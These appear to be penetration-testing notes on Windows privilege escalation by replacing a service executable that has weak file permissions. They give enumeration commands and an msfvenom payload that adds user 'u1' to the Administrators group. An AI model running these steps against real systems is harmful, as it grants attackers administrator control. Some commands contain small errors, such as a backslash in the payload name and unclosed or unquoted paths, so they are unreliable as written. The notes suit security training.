Many Windows services run executables from specific file path, such as ``C:\Program Files\``. if the permissions on these executable files are misconfigured, attackers can potentially replace the executable with a malicious one to escalate privileges or perform other malicious activities.

---

### Tools for Enumeration

1. **PowerUp** - A PowerShell based tool for identifying and exploiting Windows privilege escalation vulnerabilities, including insecure service permissions

2. **SC (Service Control)** -

command to query service security descriptors

```cmd
sc sdshow <service_name>
```

3. **accesschk.exe (Sysinternals)**

```cmd
accesschk64.exe -uvwc <service_name>
```

---

### Enumeration of Service Executable Path Permissions

#### 1. Query Serviced Information

```cmd
sc query <service_name>
```

#### 2. Check File Permissions with ``accesschk.exe``

```cmd
accesschk64.exe -wvu "C:\Program Files\any_program
```

this will show if the current user has write(``w``) or other permissions on the service executable

```cmd
accesschk64.exe -wvu C:\Program Files\mspaint.exe
```

#### 3. Inspect File Permissions with PowerShell

```powershell
powershell.exe -ep bypass
```

```powershell
Get-Acl "C:\Program Files\any_program" | fl
```

---

### Exploitation process

#### 1. Stop the Serviced

```cmd
sc stop <service_name>
```

#### 2. Replace the Executable

```bash
msfvenom -p windows\exec CMD="net localgroup administrators u1 /add" -f exe -o mspaint.exe
```
This command generate a malicious executable (``mspaint.exe``) that will add the user ``u1`` to the ``administrators`` group

* Replace the target executable (``mspaint.exe``) with your malicious payload. This file should placed in the same directory as the legitimate service executable


#### 3. Start the Service

```cmd
sc start <service_name>
```

